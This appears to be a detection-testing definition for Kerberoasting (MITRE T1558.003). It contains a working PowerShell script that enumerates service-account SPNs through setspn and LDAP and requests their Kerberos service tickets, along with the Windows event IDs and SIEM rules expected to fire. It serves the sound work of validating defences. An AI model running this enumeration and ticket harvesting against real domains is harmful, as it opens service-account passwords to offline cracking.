id: T1558.003
name: Kerberoasting — Service Ticket Request
description: Uses native .NET KerberosRequestorSecurityToken (the same class PowerView's Invoke-Kerberoast uses internally) to request Kerberos TGS tickets for SPN-registered accounts. setspn.exe SPN enumeration generates EID 4688. On the DC, EID 4769 with EncryptionType=0x17 (RC4-HMAC) is the canonical Kerberoasting indicator — AES256 (0x12) = normal; RC4 (0x17) = cracking-ready downgrade. Exabeam has 22 rules.
tactic: credential-access
technique_id: T1558.003
platform: windows
phase: attack
elevation_required: false
expected_events:
  - event_id: 4769
    channel: "Security"
    description: "Kerberos TGS request - TicketEncryptionType=0x17 RC4 = Kerberoasting indicator"
  - event_id: 4688
    channel: "Security"
    description: "setspn.exe with -T -Q */* arguments"
  - event_id: 4104
    channel: "Microsoft-Windows-PowerShell/Operational"
    description: "PowerShell ScriptBlock - KerberosRequestorSecurityToken / LDAP SPN enumeration"
tags:
  - credential-access
  - active-directory
  - no-prereqs
executor:
  type: powershell
  command: |-
    Write-Host "[T1558.003] Kerberoasting — SPN enumeration + TGS ticket request"

    # Step 1: setspn.exe SPN enumeration (EID 4688 for setspn.exe)
    Write-Host "--- Step 1: SPN enumeration via setspn.exe (EID 4688) ---"
    setspn.exe -T $env:USERDNSDOMAIN -Q */* 2>&1 | Select-Object -First 20 | Write-Host

    # Step 2: LDAP SPN enumeration — service accounts with SPNs (Kerberoasting targets)
    Write-Host "--- Step 2: LDAP SPN enumeration (EID 4104 + LDAP query on DC) ---"
    try {
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        $searcher.PropertiesToLoad.AddRange(@("servicePrincipalName","sAMAccountName","distinguishedName"))
        $results = $searcher.FindAll()
        Write-Host "SPN-enabled accounts found: $($results.Count)"
        $results | ForEach-Object {
            $acct = $_.Properties["samaccountname"]
            $_.Properties["serviceprincipalname"] | ForEach-Object { Write-Host "  SPN: $_ (account: $acct)" }
        }
    } catch { Write-Host "LDAP SPN enumeration: $_" }

    # Step 3: KerberosRequestorSecurityToken TGS request
    # This generates EID 4769 on DC with EncryptionType=0x17 if account supports RC4
    Write-Host "--- Step 3: KerberosRequestorSecurityToken TGS request (EID 4769 on DC) ---"
    Add-Type -AssemblyName System.IdentityModel
    $spnsToRequest = @()

    # Request tickets for found SPNs
    if ($results -and $results.Count -gt 0) {
        foreach ($r in $results) {
            foreach ($spn in $r.Properties["serviceprincipalname"]) {
                $spnsToRequest += $spn
            }
        }
    }
    # Always try local machine SPNs as fallback
    $spnsToRequest += "HOST/$env:COMPUTERNAME", "HOST/$env:COMPUTERNAME.$env:USERDNSDOMAIN"

    foreach ($spn in ($spnsToRequest | Select-Object -First 5)) {
        try {
            $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
            Write-Host "  TGS requested for: $spn (EID 4769 on DC — check EncryptionType field)"
        } catch { Write-Host "  SPN skip: $spn ($_)" }
    }

    # Step 4: klist to show acquired tickets
    Write-Host "--- Step 4: klist — acquired Kerberos tickets ---"
    klist 2>&1 | Select-String "Service Name|Encryption Type|KerbTicket" | Write-Host

    Write-Host "[T1558.003] Complete. EID 4769 on DC: EncryptionType=0x17 (RC4) = Kerberoastable."
siem_coverage:
  sentinel:
    - "Potential Kerberoasting"
cleanup: ""
